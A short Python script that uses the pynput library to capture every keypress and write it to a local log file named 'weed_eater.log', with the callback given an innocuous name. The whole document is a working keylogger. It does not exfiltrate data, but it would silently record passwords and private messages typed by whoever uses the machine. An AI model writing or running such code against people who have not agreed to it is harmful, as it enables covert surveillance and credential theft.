#!venv/bin/python
from pynput.keyboard import Key, Listener


def weed_eater(event):
	print(event, end=';', file=file)


if __name__ == '__main__':
	try:
		with Listener(on_press=weed_eater) as listener, open('weed_eater.log', 'w') as file:
			listener.join()
	except KeyboardInterrupt:
		exit()
